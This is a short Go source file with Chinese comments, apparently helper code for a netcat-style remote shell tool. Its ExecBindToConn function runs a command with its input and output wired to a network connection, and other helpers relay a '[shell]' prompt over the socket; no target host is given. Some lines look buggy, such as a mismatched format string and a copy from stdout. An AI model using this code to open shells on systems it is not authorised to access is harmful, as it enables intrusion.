package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
)

//输入输出👇
func WriteToConn(Conn net.Conn) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("[shell]")
		text, _ := reader.ReadString('\n')
		if len(text) > 0 {
			_, err := Conn.Write([]byte(text))
			CheckError(err,"connect error Write")
		}
	}
}
func ReadFromConn(Conn net.Conn) {
	scanner := bufio.NewScanner(Conn)
	for scanner.Scan() {
		fmt.Println(scanner.Text())
		//"[Client]", 
	}
}
/*-------------------------------------------------*/
//👇io.Copy这个函数在Windows这报错，Linux没有进行尝试
func CopyToConn(Conn net.Conn, done chan struct{}) {

	_, err := io.Copy(Conn, os.Stdout)
	CheckError(err,"connect error Copy")
	done <- struct{}{}

}
func GetFromConn(Conn net.Conn, done chan struct{}) {
	_, err := io.Copy(os.Stdout, Conn)
	CheckError(err,"connect error Get")
	done <- struct{}{}
}
/*-------------------------------------------------*/
//👇检查报错
func CheckError(err error,s string) {
	if err != nil {
		fmt.Printf("[-]%s\n", err,s)
		os.Exit(1)
		//0表示正常退出，1表示不正常
	}
}
/*-------------------------------------------------*/
//👇
func ExecBindToConn(Conn net.Conn,cmdstr string){
	cmd:=exec.Command(cmdstr)

	cmd.Stdin=Conn
	cmd.Stdout=Conn
	cmd.Stderr=Conn

	err:=cmd.Run()
	CheckError(err,"Exec Error")

}
